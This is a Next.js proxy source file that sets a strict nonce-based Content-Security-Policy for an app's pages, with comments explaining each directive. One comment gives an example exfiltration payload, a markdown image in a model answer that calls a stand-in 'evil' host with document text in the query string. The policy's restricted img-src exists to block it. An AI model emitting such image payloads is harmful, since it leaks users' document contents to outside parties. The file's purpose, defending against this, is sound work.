import { NextResponse, type NextRequest } from "next/server";

// Per-request nonce CSP for pages (plan §9, audit S8/N1). Follows node_modules/next/dist/docs/01-app/02-guides/content-security-policy.md.
// img-src has no remote hosts: a model answer with ![](https://evil/?q=<document text>) can't phone home.
export function proxy(request: NextRequest) {
  const nonce = Buffer.from(crypto.randomUUID()).toString("base64");
  const dev = process.env.NODE_ENV === "development";
  const csp = [
    "default-src 'self'",
    `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'${dev ? " 'unsafe-eval'" : ""}`,
    // Dev HMR injects <style> tags. style-src-attr: React's style={{…}} props (progress bar width). Inline style
    // attributes can't load remote resources here: img-src/font-src stay 'self'.
    `style-src 'self' ${dev ? "'unsafe-inline'" : `'nonce-${nonce}'`}`,
    "style-src-attr 'unsafe-inline'",
    "img-src 'self' data: blob:",
    "font-src 'self'",
    // The studio previews the video it just recorded in this page (a blob: URL it made itself); no remote media.
    "media-src 'self' blob:",
    "connect-src 'self'",
    "object-src 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "frame-ancestors 'none'",
  ].join("; ");

  const headers = new Headers(request.headers);
  headers.set("x-nonce", nonce);
  headers.set("Content-Security-Policy", csp);
  const response = NextResponse.next({ request: { headers } });
  response.headers.set("Content-Security-Policy", csp);
  return response;
}

export const config = {
  matcher: [
    // No prefetch exemption (unlike the guide): a request header must not be able to switch the CSP off.
    "/((?!api|_next/static|_next/image|favicon.ico).*)",
  ],
};
